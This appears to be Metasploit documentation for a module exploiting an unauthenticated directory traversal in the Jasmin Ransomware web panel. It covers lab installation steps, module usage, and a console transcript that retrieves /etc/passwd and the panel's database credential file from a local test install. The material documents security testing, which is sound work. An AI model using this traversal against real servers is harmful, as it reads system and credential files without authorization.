## Vulnerable Application

The Jasmin Ransomware web server contains an unauthenticated directory traversal vulnerability
within the download functionality. As of April 15, 2024 this was still unpatched, so all
versions are vulnerable. The last patch was in 2021, so it will likely not ever be patched.

### Install

create a LAMP server (using php 8.2 worked for me, 7.2 did not).
Run the following commands:

```
git clone https://github.com/codesiddhant/Jasmin-Ransomware.git
cd Jasmin-Ransomware
sudo cp -r Web\ Panel/* /var/www/html/
sudo chown www-data:www-data /var/www/html/*
sudo mysql -p
```

Execute the following SQL commands:

```
CREATE DATABASE jasmin_db;
CREATE USER 'jasminadmin'@'localhost' IDENTIFIED BY '123456';
GRANT ALL PRIVILEGES ON jasmin_db.* TO 'jasminadmin'@'localhost';
Exit
```

Now setup the database:
`sudo mysql -u jasminadmin -p123456 jasmin_db < Web\ Panel/database/jasmin_db.sql`

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/gather/jasmin_ransomware_dir_traversal`
1. Do: `set rhosts [ip]`
1. Do: `run`
1. You should get the content of a file if it exists.

## Options

### FILE

File to retrieve. `etc/passwd` is the default, but
`var/www/html/database/db_conection.php` contains the
database credentials.

## Scenarios

### Jasmin installed on Ubuntu 22.04

```
msf6 > use auxiliary/gather/jasmin_ransomware_dir_traversal
msf6 auxiliary(gather/jasmin_ransomware_dir_traversal) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 auxiliary(gather/jasmin_ransomware_dir_traversal) > set verbose true
verbose => true
msf6 auxiliary(gather/jasmin_ransomware_dir_traversal) > rexploit
[*] Reloading module...

[+] root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
arangodb:x:998:999:ArangoDB Application User:/usr/share/arangodb3:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
postgres:x:115:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
dovecot:x:116:122:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:117:123:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
rtkit:x:118:124:RealtimeKit,,,:/proc:/usr/sbin/nologin
kernoops:x:119:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
cups-pk-helper:x:120:125:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
systemd-oom:x:121:128:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin
whoopsie:x:122:129::/nonexistent:/bin/false
geoclue:x:123:130::/var/lib/geoclue:/usr/sbin/nologin
avahi-autoipd:x:124:131:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
avahi:x:125:132:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
nm-openvpn:x:126:133:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
saned:x:127:135::/var/lib/saned:/usr/sbin/nologin
colord:x:129:136:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
sssd:x:130:137:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
pulse:x:131:138:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:132:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
gnome-initial-setup:x:133:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:134:140:Gnome Display Manager:/var/lib/gdm3:/bin/false
mysql:x:136:143:MySQL Server,,,:/nonexistent:/bin/false

[+] Saved file to: /root/.msf4/loot/20240415125844_default_127.0.0.1_jasmin.webpanel._670418.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(gather/jasmin_ransomware_dir_traversal) > set FILE var/www/html/data
base/db_conection.php
FILE => var/www/html/database/db_conection.php
msf6 auxiliary(gather/jasmin_ransomware_dir_traversal) > rexploit
[*] Reloading module...

[+] <?php
$dbcon=mysqli_connect("localhost","jasminadmin","123456");

mysqli_select_db($dbcon,"jasmin_db");

?>

[+] Saved file to: /root/.msf4/loot/20240415125905_default_127.0.0.1_jasmin.webpanel._177654.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(gather/jasmin_ransomware_dir_traversal) >
```

